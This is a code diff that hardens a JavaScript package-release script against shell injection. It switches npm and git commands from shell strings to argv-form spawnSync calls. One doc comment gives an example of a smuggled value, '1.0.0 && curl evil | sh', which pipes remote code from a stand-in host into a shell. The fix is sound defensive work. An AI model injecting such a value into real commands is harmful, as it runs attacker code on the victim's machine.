@@ -74,6 +74,23 @@ function run(cmd, opts = {}) {
   return execSync(cmd, { stdio: 'pipe', encoding: 'utf8', ...opts }).trim();
 }
 
+/**
+ * Like {@link run}, but argv form (no shell). Use this for any command that
+ * interpolates a value — a tag name, a package name — that must never be
+ * parsed by a shell. A version string like `1.0.0 && curl evil | sh` reaches
+ * `git`/`npm` as a single inert argument here rather than as shell syntax.
+ * Throws on a non-zero exit, mirroring `run`'s throw-on-error contract.
+ */
+function runArgv(file, argv, opts = {}) {
+  const r = spawnSync(file, argv, { stdio: 'pipe', encoding: 'utf8', ...opts });
+  if (r.error) throw r.error;
+  if (r.status !== 0) {
+    const detail = `${r.stderr ?? ''}${r.stdout ?? ''}`.trim();
+    throw new Error(detail || `${file} exited with ${r.status}`);
+  }
+  return (r.stdout ?? '').trim();
+}
+
 function findPublishablePackages() {
   const out = [];
   for (const name of readdirSync(PACKAGES_DIR)) {
@@ -114,18 +131,24 @@ const NOT_PUBLISHED = Symbol('not-published');
  * "couldn't tell" and abort on the latter.
  */
 function npmView(name) {
-  try {
-    return run(`npm view ${name} version`, { stdio: ['ignore', 'pipe', 'pipe'] });
-  } catch (err) {
-    const detail = `${err?.stderr ?? ''}${err?.stdout ?? ''}`;
-    if (/E404|404 Not Found|is not in (this|the) registry|code E404/i.test(detail)) {
-      return NOT_PUBLISHED;
-    }
-    throw new Error(
-      `npm view ${name} failed and it was not a 404 — refusing to treat it as a new ` +
-        `package (that could republish existing versions). Original error:\n${detail.trim() || err?.message || err}`,
-    );
+  // argv form (no shell): the package name is never parsed by a shell, and we
+  // distinguish a genuine 404 from an ambiguous failure via the exit result.
+  const r = spawnSync('npm', ['view', name, 'version'], {
+    stdio: ['ignore', 'pipe', 'pipe'],
+    encoding: 'utf8',
+  });
+  if (r.error) {
+    throw new Error(`npm view ${name} could not run: ${r.error.message}`);
   }
+  if (r.status === 0) return (r.stdout ?? '').trim();
+  const detail = `${r.stderr ?? ''}${r.stdout ?? ''}`;
+  if (/E404|404 Not Found|is not in (this|the) registry|code E404/i.test(detail)) {
+    return NOT_PUBLISHED;
+  }
+  throw new Error(
+    `npm view ${name} failed and it was not a 404 — refusing to treat it as a new ` +
+      `package (that could republish existing versions). Original error:\n${detail.trim() || `exit ${r.status}`}`,
+  );
 }
 
 /**
@@ -421,7 +444,7 @@ function maybeTag(packages) {
     return;
   }
   try {
-    run(`git tag ${tagName}`, { stdio: 'pipe' });
+    runArgv('git', ['tag', tagName]);
     success(`Created tag ${tagName}`);
   } catch (err) {
     fail(`Failed to create tag ${tagName}: ${err.message}`);
@@ -429,7 +452,7 @@ function maybeTag(packages) {
   }
   if (PUSH_TAG) {
     try {
-      run(`git push origin ${tagName}`, { stdio: 'pipe' });
+      runArgv('git', ['push', 'origin', tagName]);
       success(`Pushed tag ${tagName} to origin`);
     } catch (err) {
       fail(`Failed to push tag: ${err.message}`);
